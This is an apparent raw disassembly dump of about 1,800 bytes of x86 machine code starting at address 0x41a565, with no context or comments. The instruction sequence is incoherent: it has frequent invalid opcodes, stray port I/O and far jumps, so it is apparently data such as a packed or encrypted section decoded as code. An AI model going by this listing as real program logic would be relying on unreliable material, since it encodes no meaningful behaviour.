  41a565:	xor    cl,BYTE PTR [edi+0x23]
  41a568:	pop    edx
  41a569:	inc    edi
  41a56a:	ret    
  41a56b:	in     al,dx
  41a56c:	xchg   esp,eax
  41a56d:	and    DWORD PTR [edi-0x5c],0x1a3d1fef
  41a574:	repz into 
  41a576:	mov    eax,0x4a3ad4ac
  41a57b:	mov    ebp,0x1ebe675e
  41a580:	mov    dh,0xf2
  41a582:	in     al,dx
  41a583:	bound  ebp,QWORD PTR [edx]
  41a585:	js     0x41a56b
  41a587:	and    eax,0xf050bbb9
  41a58c:	xchg   edi,eax
  41a58d:	shl    edx,cl
  41a58f:	xchg   ecx,eax
  41a590:	xor    al,0x6
  41a592:	es or  eax,0xebea80c6
  41a598:	xor    dl,dh
  41a59a:	xlat   BYTE PTR ds:[ebx]
  41a59b:	test   al,0x51
  41a59d:	repz mov dh,0x96
  41a5a0:	ret    
  41a5a1:	mov    dl,0xe
  41a5a3:	scas   al,BYTE PTR es:[edi]
  41a5a4:	mov    edi,0xabce8625
  41a5a9:	pop    eax
  41a5aa:	xor    esp,DWORD PTR [ebx+0x1a5f83b7]
  41a5b0:	aas    
  41a5b1:	and    DWORD PTR [ebx],esi
  41a5b3:	pusha  
  41a5b4:	dec    esp
  41a5b5:	jl     0x41a5c3
  41a5b7:	cmp    eax,0x1808707a
  41a5bc:	push   es
  41a5bd:	sar    DWORD PTR [edx-0x18],1
  41a5c0:	add    dh,BYTE PTR ds:0xc8e637d2
  41a5c6:	pop    ss
  41a5c7:	adc    eax,0xac625cc5
  41a5cc:	imul   ecx,DWORD PTR [eax+0x3a],0xffffffd4
  41a5d0:	cmp    eax,0x23f2ed3f
  41a5d5:	iret   
  41a5d6:	stos   BYTE PTR es:[edi],al
  41a5d7:	xor    al,0x89
  41a5d9:	xor    esi,ebp
  41a5db:	dec    esp
  41a5dc:	push   0x4
  41a5de:	(bad)  
  41a5df:	sbb    edi,eax
  41a5e1:	xor    edx,DWORD PTR [eax]
  41a5e3:	pop    ecx
  41a5e4:	pop    edx
  41a5e5:	daa    
  41a5e6:	push   cs
  41a5e7:	ins    DWORD PTR es:[edi],dx
  41a5e8:	jae    0x41a58c
  41a5ea:	ror    BYTE PTR [edi],0x6
  41a5ed:	dec    ebx
  41a5ee:	sub    eax,DWORD PTR [edi+0x7ea947a4]
  41a5f4:	xchg   ebp,eax
  41a5f5:	test   al,0x81
  41a5f7:	idiv   BYTE PTR [eax-0x458daf4b]
  41a5fd:	in     al,dx
  41a5fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5ff:	or     edx,DWORD PTR [edx+0x24]
  41a602:	or     edx,DWORD PTR [esi]
  41a604:	jmp    0x4083:0x3ce5f5b5
  41a60b:	test   al,0x98
  41a60d:	std    
  41a60e:	retf   
  41a60f:	xchg   esi,eax
  41a610:	(bad)  
  41a611:	lds    ecx,FWORD PTR [edi-0x29]
  41a614:	add    cl,bl
  41a616:	scas   al,BYTE PTR es:[edi]
  41a617:	add    ebx,edx
  41a619:	sub    cl,ah
  41a61b:	dec    eax
  41a61c:	xchg   edx,eax
  41a61d:	lods   al,BYTE PTR ds:[esi]
  41a61e:	pop    edx
  41a61f:	rcl    BYTE PTR [ebp+0x26c5fa58],1
  41a625:	(bad)  
  41a627:	ror    BYTE PTR [esi],0xe3
  41a62a:	add    eax,ebx
  41a62c:	or     BYTE PTR [edx],0x54
  41a62f:	outs   dx,BYTE PTR ds:[esi]
  41a630:	push   0xb9a0e27e
  41a635:	jo     0x41a646
  41a637:	in     al,0x39
  41a639:	mov    edi,0x82a9daa2
  41a63e:	sub    BYTE PTR [eax+0x42],dl
  41a641:	call   0x2212:0x3dd691d3
  41a648:	pop    ss
  41a649:	adc    ecx,edi
  41a64b:	fadd   QWORD PTR gs:[edx+ecx*8]
  41a64f:	pusha  
  41a650:	nop
  41a651:	jge    0x41a69a
  41a653:	dec    edx
  41a654:	push   ds
  41a655:	inc    BYTE PTR [ebp+0x5db0199b]
  41a65b:	mov    ch,0xc8
  41a65d:	dec    ebx
  41a65e:	push   es
  41a65f:	inc    DWORD PTR [edx+0x71]
  41a662:	call   0x3dac:0xd7ea408b
  41a669:	leave  
  41a66a:	mov    dl,0xd5
  41a66c:	cmp    BYTE PTR ds:0xd0c82e74,dl
  41a672:	mov    edx,DWORD PTR [edx+ebx*4]
  41a675:	imul   bl
  41a677:	fnstsw WORD PTR [ebx+esi*4-0x7d]
  41a67b:	and    esp,DWORD PTR [eax]
  41a67d:	gs (bad) 
  41a67f:	outs   dx,DWORD PTR ds:[esi]
  41a680:	adc    al,0x1e
  41a682:	adc    dl,dl
  41a684:	xor    al,0x3d
  41a686:	int3   
  41a687:	xlat   BYTE PTR ds:[ebx]
  41a688:	jle    0x41a6b9
  41a68a:	mov    eax,ds:0xb22866b6
  41a68f:	sbb    al,0xe6
  41a691:	popf   
  41a692:	dec    ebp
  41a693:	add    eax,0x19ba2967
  41a698:	mov    ds:0xcce6a6e8,al
  41a69d:	pop    eax
  41a69e:	mov    dh,0x6
  41a6a0:	xchg   edx,eax
  41a6a1:	(bad)  
  41a6a2:	xchg   ebx,eax
  41a6a3:	shr    BYTE PTR [ebx],1
  41a6a5:	loopne 0x41a696
  41a6a7:	jno    0x41a640
  41a6a9:	inc    eax
  41a6aa:	mov    ebx,0xd97fabea
  41a6af:	out    dx,al
  41a6b0:	iret   
  41a6b1:	shl    DWORD PTR [ebp-0x5a],cl
  41a6b4:	fstp   DWORD PTR [eax+0x73]
  41a6b7:	retf   
  41a6b8:	mov    DWORD PTR [ebp+0x504466f7],edx
  41a6be:	cmp    ebx,DWORD PTR [ecx]
  41a6c0:	(bad)  
  41a6c1:	cmc    
  41a6c2:	jne    0x41a707
  41a6c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6c5:	sub    ah,BYTE PTR [esi-0x50b928b9]
  41a6cb:	(bad)
  41a6cf:	stos   BYTE PTR es:[edi],al
  41a6d0:	and    BYTE PTR ds:0x94f1b4ab,dh
  41a6d6:	xor    eax,0xbfc233
  41a6db:	jbe    0x41a72e
  41a6dd:	cmp    edi,esi
  41a6df:	cli    
  41a6e0:	mov    edi,cs
  41a6e2:	jp     0x41a72b
  41a6e4:	jne    0x41a679
  41a6e6:	mov    dh,0x5a
  41a6e8:	pop    esi
  41a6e9:	and    eax,0xec81279d
  41a6ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6ef:	fndisi(8087 only) 
  41a6f1:	sahf   
  41a6f2:	shl    al,0x35
  41a6f5:	lods   al,BYTE PTR ds:[esi]
  41a6f6:	sahf   
  41a6f7:	pop    esi
  41a6f8:	inc    ecx
  41a6f9:	ja     0x41a6bb
  41a6fb:	and    eax,0x2ce4dd6b
  41a700:	lea    ebp,[ecx]
  41a702:	xor    al,0x8e
  41a704:	aad    0xa2
  41a706:	or     eax,0x813d2797
  41a70b:	dec    ecx
  41a70c:	mov    gs:0x39ab83a4,al
  41a712:	sbb    DWORD PTR [eax],0x8a8031ed
  41a718:	jbe    0x41a744
  41a71a:	ret    0xe8e5
  41a71d:	int3   
  41a71e:	push   edx
  41a71f:	push   ds
  41a720:	push   ecx
  41a721:	imul   BYTE PTR [ebx]
  41a723:	sub    DWORD PTR [edi-0x36],ebp
  41a726:	mov    dh,0xd9
  41a728:	in     eax,0xf7
  41a72a:	xor    BYTE PTR [esi-0x2],dh
  41a72d:	pop    esp
  41a72e:	dec    edx
  41a72f:	into   
  41a730:	push   0x41
  41a732:	(bad)  
  41a733:	adc    eax,0x273aecb7
  41a738:	out    dx,eax
  41a739:	dec    ebp
  41a73a:	aam    0xd3
  41a73c:	xchg   edi,eax
  41a73d:	mov    ch,0x76
  41a73f:	pop    eax
  41a740:	mov    edi,0xb6082fc9
  41a745:	dec    ebx
  41a746:	pop    esi
  41a747:	nop
  41a748:	sub    BYTE PTR [edx],dh
  41a74a:	add    ebp,DWORD PTR [esi]
  41a74c:	push   ecx
  41a74d:	stc    
  41a74e:	outs   dx,DWORD PTR ds:[esi]
  41a74f:	push   esp
  41a750:	dec    eax
  41a751:	in     al,dx
  41a752:	mov    BYTE PTR [ebx+esi*1],cl
  41a755:	jg     0x41a72e
  41a757:	cwde   
  41a758:	scas   al,BYTE PTR es:[edi]
  41a759:	pop    esp
  41a75a:	adc    DWORD PTR [ebp+0x349820e],0xf814b78d
  41a764:	sub    ecx,DWORD PTR [edx-0x73495258]
  41a76a:	xlat   BYTE PTR ds:[ebx]
  41a76b:	aaa    
  41a76c:	fcmovnbe st,st(0)
  41a76e:	mov    eax,0x7b05a6e4
  41a773:	cmp    al,0xf5
  41a775:	jbe    0x41a734
  41a777:	out    0x18,eax
  41a779:	in     eax,dx
  41a77a:	xchg   ebx,eax
  41a77b:	jmp    0x41a7ba
  41a77d:	pop    ss
  41a77e:	sar    BYTE PTR [ebx+0x2b],cl
  41a781:	nop
  41a782:	adc    cl,BYTE PTR [eax+0x74]
  41a785:	or     eax,0x78aa849d
  41a78a:	push   esp
  41a78b:	mov    bl,0xaa
  41a78d:	loop   0x41a787
  41a78f:	dec    edx
  41a790:	cmp    eax,0xff4461de
  41a795:	es and al,0xba
  41a798:	jae    0x41a7d9
  41a79a:	xchg   edi,eax
  41a79b:	sbb    eax,0x1333b812
  41a7a0:	dec    ecx
  41a7a1:	jno    0x41a809
  41a7a3:	sahf   
  41a7a4:	or     al,0x8f
  41a7a6:	xor    bh,dl
  41a7a8:	cmp    eax,0xc7c2fed
  41a7ad:	dec    esi
  41a7ae:	and    al,0x36
  41a7b0:	mov    esp,edi
  41a7b2:	pop    ecx
  41a7b3:	inc    esp
  41a7b4:	jbe    0x41a7f1
  41a7b6:	mov    ds:0xd681dca,al
  41a7bb:	pop    eax
  41a7bc:	fist   DWORD PTR [ecx]
  41a7be:	dec    edx
  41a7bf:	mov    cl,0xf8
  41a7c1:	pop    ds
  41a7c2:	out    0x1a,eax
  41a7c4:	test   ebx,ecx
  41a7c6:	out    0x5b,eax
  41a7c8:	sbb    eax,0x11f7246a
  41a7cd:	xor    BYTE PTR fs:[edi],cl
  41a7d0:	(bad)  
  41a7d1:	sbb    eax,0x4258d11d
  41a7d6:	cmp    dl,bl
  41a7d8:	mov    eax,0xda695ef
  41a7dd:	mov    BYTE PTR [ebp+0x1051abfa],ch
  41a7e3:	popf   
  41a7e4:	mov    dh,0x5e
  41a7e6:	sar    DWORD PTR [esi-0x75],cl
  41a7e9:	test   al,0x8
  41a7eb:	inc    edx
  41a7ec:	cld    
  41a7ed:	outs   dx,BYTE PTR ds:[esi]
  41a7ee:	or     dl,BYTE PTR [esi]
  41a7f0:	enter  0x8bf0,0xf0
  41a7f4:	jecxz  0x41a811
  41a7f6:	mov    eax,0xc20a6f7b
  41a7fb:	enter  0x91b6,0x61
  41a7ff:	cmp    dh,BYTE PTR [ebx+0x291fc9c8]
  41a805:	test   eax,0x82130d5c
  41a80a:	adc    eax,0x3feaf1d
  41a80f:	lahf   
  41a810:	fcmovb st,st(1)
  41a812:	ret    0xcec2
  41a815:	sub    BYTE PTR [eax],0xb6
  41a818:	mov    DWORD PTR [edx-0x38],edx
  41a81b:	ins    BYTE PTR es:[edi],dx
  41a81c:	jecxz  0x41a859
  41a81e:	in     eax,0x94
  41a820:	rcr    BYTE PTR [ecx],0xa6
  41a823:	lock ror BYTE PTR [ebx+eiz*1-0x18],cl
  41a828:	cmp    bh,BYTE PTR [edx+eax*1]
  41a82b:	mov    edx,0x9dbeb73a
  41a830:	add    eax,DWORD PTR [ebp-0x2c]
  41a833:	cli    
  41a834:	jbe    0x41a866
  41a836:	lock inc esi
  41a838:	xchg   BYTE PTR [ebx+0x40],dl
  41a83b:	out    0xab,eax
  41a83d:	jbe    0x41a83f
  41a83f:	fidivr DWORD PTR [edx+0x16f53814]
  41a845:	mov    al,BYTE PTR [eax]
  41a847:	inc    ebx
  41a848:	push   0x4ad9f841
  41a84d:	es ja  0x41a7fb
  41a850:	sbb    eax,0xbdd7239
  41a855:	popa   
  41a856:	es sahf 
  41a858:	or     DWORD PTR [edx+ebp*2+0x60],ebx
  41a85c:	jbe    0x41a866
  41a85e:	jmp    0x41a7f7
  41a860:	xor    BYTE PTR [ebx-0x49],0xd2
  41a864:	jp     0x41a83e
  41a866:	sti    
  41a867:	jmp    0xcd69:0xa8d154c1
  41a86e:	and    esp,DWORD PTR [ecx+0x6c]
  41a871:	xchg   esp,eax
  41a872:	inc    ebx
  41a873:	xchg   DWORD PTR [eax+0xc],edi
  41a876:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a877:	inc    ebx
  41a878:	jo     0x41a86d
  41a87a:	jne    0x41a813
  41a87c:	addr16 cmc 
  41a87e:	out    0x62,eax
  41a880:	(bad)
  41a884:	aam    0x6e
  41a886:	ja     0x41a8ba
  41a888:	ss jns 0x41a8b1
  41a88b:	adc    DWORD PTR [eax],ebx
  41a88d:	cmp    esi,esi
  41a88f:	(bad)  
  41a890:	cwde   
  41a891:	cld    
  41a892:	jae    0x41a904
  41a894:	fisttp WORD PTR [eax+ebp*8]
  41a897:	jnp    0x41a84f
  41a899:	dec    eax
  41a89a:	sahf   
  41a89b:	cmp    BYTE PTR [eax+0x5b],ah
  41a89e:	pop    eax
  41a89f:	mov    bl,0xb7
  41a8a1:	je     0x41a87d
  41a8a3:	das    
  41a8a4:	cmp    eax,0xfe027712
  41a8a9:	jnp    0x41a83f
  41a8ab:	adc    ebp,0xffffff92
  41a8ae:	sub    cl,BYTE PTR [edi]
  41a8b0:	rcl    DWORD PTR [edi],1
  41a8b2:	test   BYTE PTR [edx],dl
  41a8b4:	add    al,0xf9
  41a8b6:	in     eax,dx
  41a8b7:	and    edx,DWORD PTR ds:0x8161366c
  41a8bd:	xchg   ecx,eax
  41a8be:	pushf  
  41a8bf:	xor    BYTE PTR [esi],bl
  41a8c1:	ins    DWORD PTR es:[edi],dx
  41a8c2:	xor    al,0xb0
  41a8c4:	fwait
  41a8c5:	jl     0x41a86b
  41a8c7:	mov    WORD PTR [edx],?
  41a8c9:	dec    edx
  41a8ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8cb:	lods   eax,DWORD PTR ds:[esi]
  41a8cc:	hlt    
  41a8cd:	add    edx,DWORD PTR [ebx]
  41a8cf:	imul   esi,DWORD PTR [esi+eax*2],0xeef31c5c
  41a8d6:	je     0x41a8a3
  41a8d8:	dec    edi
  41a8d9:	push   ebx
  41a8da:	and    ebp,DWORD PTR [ebp-0x1019c835]
  41a8e0:	inc    eax
  41a8e1:	(bad)  
  41a8e2:	push   cs
  41a8e3:	test   al,0x1c
  41a8e5:	popa   
  41a8e6:	push   esi
  41a8e7:	mov    ecx,0x4d493905
  41a8ec:	pusha  
  41a8ed:	outs   dx,DWORD PTR ds:[esi]
  41a8ee:	sub    eax,0x91fe0da2
  41a8f3:	cmp    eax,0x9f9bc63a
  41a8f8:	sahf   
  41a8f9:	inc    ebx
  41a8fa:	mov    bx,0x33ed
  41a8fe:	xchg   ebx,eax
  41a8ff:	dec    ebp
  41a900:	fnsave [edi-0xa830031]
  41a906:	loopne 0x41a8a0
  41a908:	adc    al,0xc8
  41a90a:	jp     0x41a923
  41a90c:	cmp    edx,ecx
  41a90e:	in     al,dx
  41a90f:	cdq    
  41a910:	mov    ch,0xf7
  41a912:	bound  eax,QWORD PTR [ecx+0x3503a577]
  41a918:	(bad)  
  41a919:	and    dh,BYTE PTR [ecx+0x7f]
  41a91c:	out    0x2b,eax
  41a91e:	inc    edi
  41a91f:	xor    eax,0x80a6832e
  41a924:	inc    cx
  41a926:	icebp  
  41a927:	push   ds
  41a928:	xor    ecx,DWORD PTR [ebx+0x6]
  41a92b:	or     al,0xaa
  41a92d:	pop    esi
  41a92e:	pop    esp
  41a92f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a930:	in     al,0x64
  41a932:	xor    DWORD PTR ds:0xcacbbdeb,eax
  41a938:	mov    ebp,0xb0d01667
  41a93d:	jg     0x41a8e4
  41a93f:	cmc    
  41a940:	sbb    al,BYTE PTR [ebp+edx*8-0x4f]
  41a944:	xlat   BYTE PTR ds:[ebx]
  41a945:	inc    edx
  41a946:	jmp    0x3f8a:0x2036b1fa
  41a94d:	test   al,0x49
  41a94f:	icebp  
  41a950:	fist   DWORD PTR [ebp-0x5e]
  41a953:	add    al,ch
  41a955:	jle    0x41a9d1
  41a957:	xor    al,0x6
  41a959:	ficomp DWORD PTR [eax-0x77]
  41a95c:	sub    edx,edi
  41a95e:	jnp    0x41a935
  41a960:	add    al,0xc2
  41a962:	sahf   
  41a963:	jno    0x41a8e7
  41a965:	out    dx,al
  41a966:	pop    ecx
  41a967:	mov    dl,BYTE PTR [edx-0xe645bcb]
  41a96d:	mov    ecx,0x8e86d17d
  41a972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a973:	or     eax,0xbc442a98
  41a978:	cli    
  41a979:	inc    ecx
  41a97a:	adc    eax,0xfa63b62f
  41a97f:	aaa    
  41a980:	in     al,dx
  41a981:	xchg   esp,eax
  41a982:	aaa    
  41a983:	push   ecx
  41a984:	jl     0x41a990
  41a986:	sbb    eax,0x488e5a72
  41a98b:	cmp    al,0x72
  41a98d:	fwait
  41a98e:	adc    DWORD PTR [esi+ecx*8-0x23],0xf15e99f7
  41a996:	cld    
  41a997:	jp     0x41aa02
  41a999:	dec    esp
  41a99a:	rcr    BYTE PTR [esi-0x1ac19b43],0x85
  41a9a1:	mov    ebp,0x83c80a27
  41a9a6:	leave  
  41a9a7:	fcmovnbe st,st(4)
  41a9a9:	dec    esi
  41a9aa:	call   FWORD PTR [esi+0x770a2ac8]
  41a9b0:	jecxz  0x41a9be
  41a9b2:	out    dx,eax
  41a9b3:	fs inc eax
  41a9b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9b6:	lods   eax,DWORD PTR ds:[esi]
  41a9b7:	sbb    esi,DWORD PTR [eax-0xf342cb6]
  41a9bd:	cwde   
  41a9be:	into   
  41a9bf:	jo     0x41a991
  41a9c1:	das    
  41a9c2:	fsub   st(7),st
  41a9c4:	and    DWORD PTR [ebp+0x11],eax
  41a9c7:	xor    eax,0x8286b2d4
  41a9cc:	inc    ecx
  41a9cd:	pop    ecx
  41a9ce:	adc    dl,BYTE PTR [ecx+0x73bfa082]
  41a9d4:	not    DWORD PTR [ebx+0x3b]
  41a9d7:	mov    esi,0xe153f780
  41a9dc:	push   edi
  41a9dd:	inc    ebx
  41a9de:	call   0x6bfe25cb
  41a9e3:	lea    ebp,[ebx+0x5d]
  41a9e6:	xchg   edx,eax
  41a9e7:	lock xchg eax,esp
  41a9ea:	fnstenv [eax]
  41a9ec:	cmp    DWORD PTR [ebx+0x66],edx
  41a9ef:	sbb    BYTE PTR [ecx],bl
  41a9f1:	shr    DWORD PTR [ebx-0x10b91616],0xad
  41a9f8:	mov    edi,0x12831b96
  41a9fd:	aam    0x5a
  41a9ff:	or     BYTE PTR [esi],0x6
  41aa02:	dec    ebp
  41aa03:	cmc    
  41aa04:	cmp    ecx,DWORD PTR [eax-0x13]
  41aa07:	popf   
  41aa08:	push   ebp
  41aa09:	xchg   ecx,eax
  41aa0a:	push   cs
  41aa0b:	pusha  
  41aa0c:	sar    DWORD PTR [edi],1
  41aa0e:	nop
  41aa0f:	pop    edi
  41aa10:	push   eax
  41aa11:	and    al,0x2
  41aa13:	pop    edi
  41aa14:	xor    ah,cl
  41aa16:	cmp    eax,0x7e93999
  41aa1b:	pusha  
  41aa1c:	mov    ah,0xb
  41aa1e:	mov    al,ds:0x6548dc84
  41aa23:	adc    esi,ebp
  41aa25:	mov    edx,0xedcc1668
  41aa2a:	(bad)  
  41aa2c:	lods   al,BYTE PTR ds:[esi]
  41aa2d:	retf   0x727c
  41aa30:	mov    eax,ds:0x1a4b8205
  41aa35:	hlt    
  41aa36:	mov    ds:0x59f0227b,eax
  41aa3b:	push   edi
  41aa3c:	(bad)  
  41aa3d:	(bad)  
  41aa3e:	cmp    edx,DWORD PTR [edx]
  41aa40:	faddp  st(0),st
  41aa42:	aaa    
  41aa43:	pop    esi
  41aa44:	sub    esp,0xffffffa5
  41aa47:	inc    ecx
  41aa48:	lea    ebx,[ecx+0x6f]
  41aa4b:	sbb    BYTE PTR [eax-0x4b],bh
  41aa4e:	popa   
  41aa4f:	mov    esp,0x9bd23423
  41aa54:	sbb    eax,0x98fb73a1
  41aa59:	mov    dh,0x3
  41aa5b:	jno    0x41aab4
  41aa5d:	(bad)  
  41aa5e:	ja     0x41aab5
  41aa60:	mov    al,ds:0x4358120
  41aa65:	pushf  
  41aa66:	loope  0x41aa11
  41aa68:	pushf  
  41aa69:	cmp    cl,BYTE PTR [edx+0xc]
  41aa6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa6d:	sub    DWORD PTR [edi+0x14683413],esi
  41aa73:	imul   eax,DWORD PTR [edi-0x6537812],0x49
  41aa7a:	push   eax
  41aa7b:	pop    esi
  41aa7c:	pop    esi
  41aa7d:	jae    0x41aa3c
  41aa7f:	sbb    al,0x87
  41aa81:	or     DWORD PTR [edi-0x41088fdc],ebp
  41aa87:	clc    
  41aa88:	call   0xc78f:0x33c8de09
  41aa8f:	jmp    0xeb9ea8ee
  41aa94:	repnz pop es
  41aa96:	aaa    
  41aa97:	inc    ebp
  41aa98:	shl    ebp,0xc7
  41aa9b:	fsubp  st(1),st
  41aa9d:	imul   esp,DWORD PTR [edx+0x35650af],0x12
  41aaa4:	or     eax,0x61c2fa02
  41aaa9:	push   eax
  41aaaa:	test   ecx,eax
  41aaac:	xchg   edi,eax
  41aaad:	mov    al,ds:0xee230288
  41aab2:	xchg   esi,eax
  41aab3:	xor    bh,BYTE PTR [eax+0x10]
  41aab6:	fidivr DWORD PTR [edx-0x2e548ea7]
  41aabc:	rol    BYTE PTR [ebx-0x62a36f4e],0x3b
  41aac3:	sbb    DWORD PTR [edi-0x366ec37f],ebx
  41aac9:	test   eax,esp
  41aacb:	std    
  41aacc:	into   
  41aacd:	inc    ebp
  41aace:	jo     0x41aa82
  41aad0:	cmp    BYTE PTR [edi-0x6],0x85
  41aad4:	dec    edi
  41aad5:	stos   DWORD PTR es:[edi],eax
  41aad6:	sbb    DWORD PTR [ebx+0x1],0x222d0663
  41aadd:	mov    ds,WORD PTR [esi+esi*1-0x7f4c4310]
  41aae4:	mov    BYTE PTR [eax+0x67155d8d],bh
  41aaea:	sti    
  41aaeb:	les    ecx,FWORD PTR [edi]
  41aaed:	adc    BYTE PTR [edi-0x1b],bh
  41aaf0:	fdivr  QWORD PTR [ebp-0xd32d761]
  41aaf6:	clc    
  41aaf7:	inc    esp
  41aaf8:	push   cs
  41aaf9:	jge    0x41aa89
  41aafb:	adc    eax,0x6c3f2cf7
  41ab00:	icebp  
  41ab01:	or     ch,BYTE PTR [edi-0x18966a1e]
  41ab07:	test   BYTE PTR [edx],al
  41ab09:	imul   ecx,DWORD PTR [edi],0xffffff82
  41ab0c:	ins    BYTE PTR es:[edi],dx
  41ab0d:	push   ecx
  41ab0e:	push   cs
  41ab0f:	rcr    bh,1
  41ab11:	(bad)  
  41ab12:	lods   eax,DWORD PTR ds:[esi]
  41ab13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab14:	xlat   BYTE PTR ds:[ebx]
  41ab15:	pushf  
  41ab16:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41ab18:	pop    ss
  41ab19:	scas   al,BYTE PTR es:[edi]
  41ab1a:	cmp    DWORD PTR [ebp-0x1ffb6601],ebp
  41ab20:	sbb    DWORD PTR [edi+ecx*4],eax
  41ab23:	adc    al,0x8f
  41ab25:	xor    bl,BYTE PTR [edi-0xf]
  41ab28:	rdpmc  
  41ab2a:	cdq    
  41ab2b:	xor    ebp,DWORD PTR [edi-0x5cb82128]
  41ab31:	retf   0x7435
  41ab34:	jbe    0x41ab52
  41ab36:	fwait
  41ab37:	mov    edi,DWORD PTR [edx+0x7c]
  41ab3a:	scas   al,BYTE PTR es:[edi]
  41ab3b:	or     BYTE PTR [edx-0x446341],bl
  41ab41:	sbb    esp,DWORD PTR [esi]
  41ab43:	add    al,0x60
  41ab45:	mov    eax,ds:0xd486307f
  41ab4a:	int    0x8a
  41ab4c:	jle    0x41ab6a
  41ab4e:	aas    
  41ab4f:	icebp  
  41ab50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab51:	das    
  41ab52:	arpl   WORD PTR [ebx+ebx*2+0x3e817171],dx
  41ab59:	repnz xchg esi,eax
  41ab5b:	push   ebx
  41ab5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab5d:	stc    
  41ab5e:	mov    edi,ebx
  41ab60:	cmp    bh,BYTE PTR [ebx-0x3]
  41ab63:	ficom  WORD PTR [esi-0x357aeff3]
  41ab69:	xchg   ebx,eax
  41ab6a:	xchg   ebp,eax
  41ab6b:	jnp    0x41ab7c
  41ab6d:	stc    
  41ab6e:	pop    edi
  41ab6f:	mov    ds:0xcd1f2594,al
  41ab74:	(bad)
  41ab77:	enter  0x8e3,0x8f
  41ab7b:	dec    ebx
  41ab7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab7d:	adc    eax,0xd2ead6a0
  41ab82:	mov    cl,0x9d
  41ab84:	mov    eax,ds:0x6c650c7
  41ab89:	mov    bl,0xd2
  41ab8b:	mov    cl,0x18
  41ab8d:	dec    esp
  41ab8e:	add    al,BYTE PTR [ecx+0x7895bb61]
  41ab94:	mov    ds:0x6f2a2f54,eax
  41ab99:	ret    0xe8e0
  41ab9c:	fucomp st(2)
  41ab9e:	push   ebx
  41ab9f:	push   es
  41aba0:	mov    dl,0x56
  41aba2:	stos   BYTE PTR es:[edi],al
  41aba3:	cld    
  41aba4:	cmp    BYTE PTR [ecx+0x56],dh
  41aba7:	repz imul esp,DWORD PTR [esi-0x7f],0x36
  41abac:	test   eax,0x1128a743
  41abb1:	(bad)  
  41abb2:	jge    0x41ab59
  41abb4:	pop    ecx
  41abb5:	jo     0x41ac27
  41abb7:	push   cs
  41abb8:	bound  ebp,QWORD PTR [edx-0x38]
  41abbb:	jge    0x41ab92
  41abbd:	sbb    edx,esp
  41abbf:	not    BYTE PTR [edi+0x30]
  41abc2:	jl     0x41abb2
  41abc4:	adc    ecx,DWORD PTR [ecx]
  41abc6:	jo     0x41ab93
  41abc8:	shl    ah,0x5f
  41abcb:	popa   
  41abcc:	cmp    DWORD PTR [edi],0xffffffd8
  41abcf:	fistp  WORD PTR [ecx]
  41abd1:	cmp    eax,0x46ec13ef
  41abd6:	adc    ch,BYTE PTR [esi+ebx*2]
  41abd9:	fild   QWORD PTR [eax]
  41abdb:	inc    ecx
  41abdc:	fild   DWORD PTR [ebx]
  41abde:	aam    0x3a
  41abe0:	sbb    dh,BYTE PTR [eax+0x17]
  41abe3:	cmp    DWORD PTR [edx],0xffffffa7
  41abe6:	mov    esp,0x57254480
  41abeb:	lock out dx,al
  41abed:	fwait
  41abee:	add    ebx,0x7c
  41abf1:	or     al,0x53
  41abf3:	retf   
  41abf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abf5:	call   0x10984767
  41abfa:	cs push 0x86318ede
  41ac00:	adc    DWORD PTR [edi+0x3dd5a77a],ebp
  41ac06:	adc    al,0x88
  41ac08:	xchg   esp,eax
  41ac09:	xchg   ebp,eax
  41ac0a:	les    ebp,FWORD PTR [ebp-0x17df2a50]
  41ac10:	xor    DWORD PTR [ebx],ebx
  41ac12:	sahf   
  41ac13:	push   ss
  41ac14:	sbb    edi,DWORD PTR ds:0xde5f4a5b
  41ac1a:	push   DWORD PTR ds:0x81513891
  41ac20:	inc    di
  41ac22:	push   ebx
  41ac23:	cdq    
  41ac24:	xchg   edi,eax
  41ac25:	fwait
  41ac26:	inc    edi
  41ac27:	inc    edx
  41ac28:	xor    ebx,DWORD PTR [edx+0x343f2562]
  41ac2e:	mov    ch,0x11
  41ac30:	or     ch,dh
  41ac32:	dec    ecx
  41ac33:	scas   al,BYTE PTR es:[edi]
  41ac34:	(bad)  
  41ac35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac36:	mov    BYTE PTR [edx+0x69],ch
  41ac39:	mov    ebp,0x6df90f2b
  41ac3e:	adc    dl,BYTE PTR [edx-0x6fa89c1d]
  41ac44:	sbb    ch,BYTE PTR [esi-0x135537d3]
  41ac4a:	cmp    eax,0xb1df5069
  41ac4f:	mov    dh,0x6a
  41ac51:	adc    eax,0xd34c2e39
  41ac56:	jecxz  0x41ac25
  41ac58:	lds    esp,FWORD PTR [ebx]
  41ac5a:	pushf  
  41ac5b:	hlt    
  41ac5c:	adc    al,0x2a
  41ac5e:	jne    0x41acd0
  41ac60:	dec    ebx
  41ac61:	mov    ch,0x30
  41ac63:	sub    ecx,DWORD PTR [ebp+ebx*8+0x3a]
  41ac67:	and    BYTE PTR [edi+0x4d7cf273],0x95
  41ac6e:	add    edi,DWORD PTR [ecx-0x5ec1d066]
  41ac74:	(bad)  
  41ac75:	gs imul ebp,DWORD PTR ss:[ebx+0x50],0xffffffb1
  41ac7b:	(bad)  
  41ac7d:	stc    
  41ac7e:	(bad)
  41ac81:	jne    0x41acd3
  41ac83:	in     eax,dx
  41ac84:	nop
  41ac85:	push   0x3b
  41ac87:	xor    esi,esi
  41ac89:	pop    esi
  41ac8a:	inc    ebx
  41ac8b:	les    ebx,FWORD PTR [ebx+ebx*4]
  41ac8e:	or     BYTE PTR [eax],ah
  41ac90:	iret   
  41ac91:	cmp    eax,0x33b5b1ae
  41ac97:	push   ss
